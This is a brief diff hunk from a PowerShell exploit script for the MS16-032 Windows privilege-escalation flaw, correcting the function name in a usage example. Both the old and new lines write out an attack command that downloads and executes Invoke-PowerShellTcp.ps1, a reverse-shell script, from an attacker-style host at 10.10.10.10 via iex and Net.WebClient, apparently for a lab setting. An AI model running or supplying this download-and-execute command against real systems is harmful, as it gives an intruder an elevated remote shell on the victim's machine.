@@ -369,4 +369,4 @@ function Invoke-MS16032 {
     }
 }
 
-C:\PS> Invoke-MS16-032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
+C:\PS> Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1')"
